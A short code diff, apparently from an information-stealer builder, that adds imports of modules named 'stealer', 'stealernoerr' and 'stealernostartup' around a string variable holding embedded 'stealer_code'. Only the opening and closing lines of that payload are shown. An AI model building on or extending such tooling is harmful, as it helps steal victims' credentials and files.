@@ -1,3 +1,11 @@
+import util
+import util.stealer
+import util.stealer.code
+import util.stealer.code.stealer
+import util.stealer.code.stealernoerr
+import util.stealer.code.stealernostartup
+import util.stealer.code.stealerwithnothing
+
 stealer_code = r"""
 
 import requests
@@ -155,5 +163,6 @@ shutil.rmtree(folder_name)
 
 
 """
+
 
 
